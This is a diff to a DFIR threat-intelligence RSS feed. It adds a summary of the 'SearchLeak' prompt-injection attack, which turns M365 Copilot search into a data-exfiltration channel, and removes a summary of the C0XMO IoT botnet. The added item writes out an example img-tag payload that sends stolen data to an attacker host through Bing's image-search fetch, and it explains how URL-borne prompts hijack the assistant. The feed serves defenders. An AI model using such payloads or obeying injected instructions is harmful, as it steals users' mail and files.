@@ -5,8 +5,33 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The best DFIR research from hundreds of sources, filtered for relevance.</description>
     <language>en</language>
-    <lastBuildDate>Mon, 15 Jun 2026 13:02:11 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 15 Jun 2026 14:02:48 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>SearchLeak: How We Turned M365 Copilot Into a One-Click Data Exfiltration Weapon</title>
+      <link>https://www.varonis.com/blog/searchleak</link>
+      <description>Varonis reveals SearchLeak, a three-stage attack chain turning M365 Copilot Enterprise Search into a one-click data exfiltration weapon. Parameter-to-Prompt injection bypasses guardrails to silently steal emails, files, and security codes.
+
+Key technical details:
+• CVE-2026-42824 (Critical CVSS) chains Parameter-to-Prompt injection + HTML race condition + Bing SSRF bypass
+• Attack vector: Malicious `q` parameter in `m365.cloud.microsoft/search/?q=&lt;PROMPT&gt;` executes AI instructions instead of search queries
+• Race condition: `&lt;img&gt;` tags fire during AI streaming phase before sanitizer wraps output in `&lt;code&gt;` blocks
+• CSP bypass: Bing's allowlisted `searchbyimage` endpoint performs server-side fetch to attacker domain, exfiltrating data in URL path
+
+Attack methodology:
+• Victim clicks trusted microsoft.com link → Copilot searches mailbox/calendar/SharePoint with attacker instructions
+• AI response includes `&lt;img src="bing.com/searchbyimage?imgurl=attacker[.]com/STOLEN_DATA/img.png"&gt;`
+• Browser renders image during streaming, triggering Bing SSRF to attacker server
+• No authentication required - inherits victim's full graph permissions across organization
+
+Hunt for suspicious Copilot Search URLs with encoded HTML payloads in query parameters. Review CSP allowlists for domains performing server-side fetches on user input.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2066521810481639437</description>
+      <category>VULNERABILITY</category>
+      <source url="https://x.com/DFIR_Radar/status/2066521810481639437">DFIR Radar</source>
+      <pubDate>Mon, 15 Jun 2026 14:02:48 +0000</pubDate>
+      <guid isPermaLink="false">2066521810481639437</guid>
+    </item>
     <item>
       <title>Dark Web Profile: Fox Kitten</title>
       <link>https://socradar.io/blog/dark-web-profile-fox-kitten/</link>
@@ -1815,31 +1840,6 @@ Hunt for executables written to C:\Users\Public\Music\ from RDP sessions combine
       <source url="https://x.com/DFIR_Radar/status/2063909553797005716">DFIR Radar</source>
       <pubDate>Mon, 08 Jun 2026 09:02:38 +0000</pubDate>
       <guid isPermaLink="false">2063909553797005716</guid>
-    </item>
-    <item>
-      <title>IoT Botnet C0XMO Adds Competitor-Killing Capability</title>
-      <link>https://securityaffairs.com/193290/uncategorized/iot-botnet-c0xmo-adds-competitor-killing-capability.html</link>
-      <description>FortiGuard Labs discovered C0XMO, an evolved Gafgyt botnet variant that spreads via unpatched DD-WRT routers and actively kills competing botnets. This modular IoT malware demonstrates advanced persistence and multi-architecture targeting capabilities.
-
-Technical details:
-• Exploits CVE-2021-27137 via crafted UDP packets to port 1900/SSDP without authentication
-• Distribution server 217[.]160[.]125[.]125:15527 serves binaries for ARM, MIPS, PowerPC, SuperH, x86/x64
-• Persistence across /tmp/.sys, /var/tmp/.sys, /dev/shm/.sys with cron jobs every 15 minutes
-• Python scanner module uses 22 functions targeting CVE-2021-27137, CVE-2015-2051, CVE-2022-35914, AVTECH DVRs, and Android ADB interfaces
-
-Attack methodology:
-• Modular design separates main bot from Python scanning script for easier updates
-• Process termination targeting competing botnets, red team tools, and network services
-• Removes rival persistence mechanisms including cron jobs, rc.local, init.d services
-• 19 DDoS attack methods including UDP/TCP floods and amplification attacks
-
-Hunt for processes in /tmp/.sys paths, unexpected cron jobs with 15-minute intervals, and Python installations of requests/paramiko/beautifulsoup4 on IoT devices.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2063894311649903056</description>
-      <category>THREAT INTELLIGENCE</category>
-      <source url="https://x.com/DFIR_Radar/status/2063894311649903056">DFIR Radar</source>
-      <pubDate>Mon, 08 Jun 2026 08:02:04 +0000</pubDate>
-      <guid isPermaLink="false">2063894311649903056</guid>
     </item>
   </channel>
 </rss>
